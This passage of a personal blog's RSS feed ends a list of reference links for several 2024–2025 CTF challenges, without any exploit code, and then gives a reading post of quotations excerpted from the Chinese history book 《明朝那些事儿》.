master&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#n1ctf-2024php-master&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.ctfiot.com/213627.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.ctfiot.com/213627.html&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/m4p1e/php-exploit/tree/master/n1ctf24-php-master&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;php-exploit/n1ctf24-php-master at master · m4p1e/php-exploit&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://xia0.sh/blog/save-me-web-master-pwn-n1ctf-2024-php-master/save-me-web-master-pwn-n1ctf-2024-php-master&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://xia0.sh/blog/save-me-web-master-pwn-n1ctf-2024-php-master/save-me-web-master-pwn-n1ctf-2024-php-master&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;r3ctf2025_not_a_web_chal&#34;&gt;&lt;span&gt;R3CTF2025_not_a_web_chal&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#r3ctf2025_not_a_web_chal&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;强网杯-2025-go2php&#34;&gt;&lt;span&gt;强网杯 2025 go2php&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%bc%ba%e7%bd%91%e6%9d%af-2025-go2php&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;</description>
    </item>
    <item>
      <title>《明朝那些事儿》</title>
      <link>http://localhost:1313/posts/read_mcnxse/</link>
      <pubDate>Mon, 26 Jan 2026 15:32:42 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_mcnxse/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
      <description>&lt;p&gt;一本真正教人树立品性和信念的读物&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;长期的困难生活，最能磨炼一个人的意志。有很多人在遇到困难后，只能怨天尤人，得过且过，而另外一些人虽然也不得不在困难面前低头，但他们的心从未屈服，他们不断地努力，相信一定能够取得最后的胜利。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;即使你拥有人人羡慕的容貌、博览群书的才学、挥霍不尽的财富，也不能证明你的强大。因为心的强大，才是真正的强大。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个人要显示自己的力量，从来不是靠暴力，挑战这一准则的人必然会被历史从强者的行列中淘汰，历来如此。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;最强大的武器，不是军队的人数，不是强大的舰队，而是人心。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;诸位可以借鉴，遇到恨透一个人、想要拿刀去砍人的时候，用张定边的事迹勉励一下自己，不要生气，修身养性，活得比他长就是了。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;每一种主张的背后，都隐藏着某种势力或者利益的群体。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所有的书籍都有立场，所有的立场都有倾向。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;这个世界上，最让人畏惧的就是未知，如果人人都知道自己的未来，他们就不会再害怕。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;真正支配历史的人，不是朱元璋，而是稻田里辛勤劳作的老农，是官道上来往的商贾，是朝堂上进言的官员，是孤灯下苦读的学子。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;简单的占有是小聪明，暂时的放弃才是大智慧。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;他告诉我们，坚强的意志和决心可以战胜一切困难。他告诉我们，执着的信念和无畏的心灵才是最强大的武器。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;读书的能力和处理问题的能力是不一样的。书读得好，不代表事情能处理得好；能列出计划，不代表能够执行计划。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;榜样的力量是无穷的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;即使你的敌人无比强大，即使你没有好的应对方法，但只要你有敢于面对强敌的决心和勇气，你就会发现，奇迹是可以创造的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;失败算不了什么，希望的丧失才是最大的痛苦。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;是的，从历史中我们可以知道，宽容从来都不是软弱。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;为了名利去做一件事情也许可以获得动力和成功，但要成就大的事业，需要的是另一种决心和回答——为了读书而读书。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;历史的真相始终是被笼罩在迷雾中的，无数人为了各种目的去修饰和歪曲它，以适应自己的需要。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;强而不欺，威而不霸，是一个伟大国家和民族的气度与底蕴。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;暴力可以成为解决问题的后盾，但绝对不能解决问题。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;朝廷就是一个小社会，皇帝大臣们和地痞混混也没有什么区别，不过是吃得好点，穿得好点，人品更卑劣，斗争更加激烈点而已。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;无论在多么绝望的情况下，也不要放弃希望，坚持下去，就一定能够创造奇迹。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在这个污浊的世界上，能够干干净净度过自己一生的人，是值得钦佩的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在这世上，爱一个人不需要理由，从来都不需要。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;当一个人不得不走向死亡时，自杀代表着尊严和抗争。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;山近月远觉月小，便道此山大于月。&#xA;若人有眼大如天，当见山高月更阔。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“天下之大，虽离家万里，何处不可往！何事不可为！”王守仁大笑着。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;只有夺走你所拥有的一切，你才能摆脱人世间之一切浮躁与诱惑，经受千锤百炼，心如止水，透悟天地。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;要想实现崇高伟大的志向，必须有符合实际、脚踏实地的方法。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div 